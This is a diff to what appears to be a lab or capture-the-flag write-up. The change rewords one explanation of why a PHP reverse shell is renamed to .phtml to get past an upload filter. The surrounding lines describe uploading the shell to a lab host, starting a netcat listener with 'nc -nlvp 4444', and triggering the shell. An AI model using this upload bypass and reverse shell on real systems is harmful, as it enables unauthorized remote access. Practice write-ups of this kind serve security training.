@@ -43,7 +43,7 @@ dirsearch:
 - ``` cp php-reverse-shell.php ~/Documents/php_reverse_shell.phtml ``` (copy executable file to "Docuemnts" directory and change the file name to .phtml file).
 
 
-*The reason behind changing the file name to .phtml it's because .php files gets denied when uploading it so we need to use a different php extension for the file to be uploaded and then we will be able to execute the php reverse shell.
+*The file is renamed to .phtml to bypass upload restrictions on .php files, allowing us to upload and execute the PHP reverse shell.
 - Upload the executable file in the website and then go to http://10.10.88.7/uploads.
 - In the terminal start netcat listener - ``` nc -nlvp 4444 ``` > go back to the website and open the executable file > acheived reverese shell.
 
